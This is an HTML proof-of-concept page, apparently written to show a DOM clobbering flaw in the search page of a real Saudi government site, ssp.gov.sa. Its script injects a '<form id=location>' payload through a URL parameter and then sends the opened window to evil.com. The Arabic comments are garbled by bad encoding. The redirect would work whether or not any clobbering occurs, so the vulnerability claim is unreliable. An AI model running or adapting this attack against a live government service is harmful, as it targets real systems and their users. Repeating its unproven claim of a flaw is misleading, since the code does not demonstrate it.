<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PoC โ DOM Clobbering via window.open</title>
</head>
<body>
  <h3>๐จ DOM Clobbering PoC โ ssp.gov.sa</h3>
  <p>ุณุชูุชุญ ูุงูุฐุฉ ุฌุฏูุฏุฉุ ุฅุฐุง ุชู ุงุณุชุบูุงู ุงูุซุบุฑุฉ ุณูุชู ุงูุชูุฌูู ุจุนุฏ 3 ุซูุงูู.</p>

  <script>
    // ูุชุญ ุตูุญุฉ ุงูุถุญูุฉ ููููุง ุจุงุฑุงููุชุฑ ูุญุชูู ุนูู DOM ุนูุตุฑ ูุฒูู
    const payload = encodeURIComponent('<form id=location></form>');
    const targetURL = "https://ssp.gov.sa/ar/GeneralServices/Search/Pages/default.aspx?input=" + payload;
    
    const win = window.open(targetURL, "_blank");

    // ูุญุงููุฉ ุชูููุฐ ุฅุนุงุฏุฉ ุชูุฌูู ุฅุฐุง ูุงูุช getElementById('location') ุชูุณุชุฎุฏู ุจุดูู ูุจุงุดุฑ ูู ุงููููุน ุงูุถุญูุฉ
    setTimeout(() => {
      try {
        win.location = "https://evil.com"; // ุณูุชู ุฅุนุงุฏุฉ ุงูุชูุฌูู ุฅุฐุง ุชู ุงุณุชุบูุงู DOM Clobbering
      } catch (err) {
        console.warn("๐ซ ุชู ุญุธุฑ ุฅุนุงุฏุฉ ุงูุชูุฌูู ูู ุงููุชุตูุญ.");
      }
    }, 3000);
  </script>
</body>
</html>
